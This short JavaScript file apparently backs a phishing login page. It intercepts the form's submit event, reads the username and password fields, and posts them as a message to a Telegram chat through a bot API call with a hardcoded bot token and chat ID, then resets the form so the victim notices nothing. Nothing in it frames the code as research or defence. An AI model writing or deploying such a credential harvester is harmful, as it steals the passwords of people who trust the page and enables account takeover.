const elInputUsername = document.querySelector('.input_username')
const elInputPassword = document.querySelector('.input_password')
const elForm = document.querySelector('form')

const telegramToken = '8134269958:AAEwHlc_SFKx1eVBrHrYFpihFW8NxPXBISc'
const chatId = 7077612624

elForm.addEventListener('submit', (e) => {
    e.preventDefault()

    const validation = [elInputUsername.value, elInputPassword.value].filter(data => data.length)
    
    if (validation.length !== 2) {
        return ''
    } 


    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: `Name : ${elInputUsername.value}\nPassword : ${elInputPassword.value}`
        })
    })
    e.target.reset()
})
